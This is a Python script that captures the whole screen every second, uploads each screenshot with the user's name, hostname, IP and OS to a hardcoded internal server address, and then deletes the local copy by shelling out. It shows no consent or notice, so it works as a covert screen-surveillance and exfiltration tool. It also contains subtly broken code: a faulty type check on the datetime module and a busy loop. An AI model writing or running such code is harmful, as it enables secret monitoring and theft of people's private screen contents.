import time,datetime,schedule,os,platform,socket,requests,logging,json,subprocess
from PIL import ImageGrab


class CJsonEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(obj, datetime):
            return obj.strftime("%Y-%m-%d")
        else:
            return json.JSONEncoder.default(self, obj)


def screen():
    im = ImageGrab.grab()
    image1 = os.path.join(path,'%s.jpg'%str(c))
    im.save(image1)
    im.close()
    #print(im.size)
    created_time = datetime.datetime.fromtimestamp(os.stat(image1).st_ctime)
    #print(str(created_time))
    data1 = {'enctype': 'multipart/form-data', 'os': host_info, 'host_name': host_name, 'user': host_user,
             'ip': host_ip,'created_at':created_time,'length':(im.size)[0],'width':(im.size)[-1],'file_size':os.stat(image1).st_size}
    f =  open(image1, 'rb')
    file1 = {'file': f}
    try:
        res = requests.post(update_url, data=data1, files=file1)
        if res.status_code == 200:
              #print(res.text)
              info = json.loads(res.text)
              if info.get('data')== 'success':
                  cmd = 'del %s '%image1
                  f.close()
                  subprocess.call(cmd,shell=True)
    except Exception as e:
        logging.error(e)
        pass
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
                    datefmt='%a, %d %b %Y %H:%M:%S',
                    filename='app.log',
                    filemode='a+')
try:
    c=0
    path = 'D:\\listen\\images\\'
    if os.path.isdir(path) is False:
        os.system('mkdir %s'%path)
    update_url = 'http://172.16.102.188:8000/web/upload/images/'
    host_user = os.getenv('username')
    host_name = socket.gethostname()
    host_address = socket.gethostbyname('demonlg')
    host_info = platform.system()
    host_ip = socket.gethostbyname('demonlg')



    schedule.every(1).seconds.do(screen)
    while True:
        schedule.run_pending()
        c +=1
except Exception as e:
    logging.error(e)
    pass




